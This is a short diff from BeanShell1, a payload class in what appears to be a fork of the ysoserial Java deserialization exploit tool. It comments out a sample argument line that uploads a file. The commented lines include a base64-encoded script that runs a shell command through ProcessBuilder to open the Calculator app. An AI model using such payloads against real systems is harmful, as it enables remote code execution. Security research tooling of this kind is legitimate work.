@@ -57,7 +57,7 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
         //args = new String[]{"upload_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js|/tmp/JavaScriptTest2.js"};
         //args = new String[]{"script_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js"};
         //args = new String[]{"script_base64:bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlclsnKGphdmEubGFuZy5TdHJpbmdbXSknXShbJy9iaW4vc2gnLCctYycsJ29wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvciddKS5zdGFydCgp"};
-        args = new String[]{"upload_file_base64:/tmp/a.txt|YzBueTE="};
+        //args = new String[]{"upload_file_base64:/tmp/a.txt|YzBueTE="};
         PayloadRunner.run(BeanShell1.class, args);
     }
 }
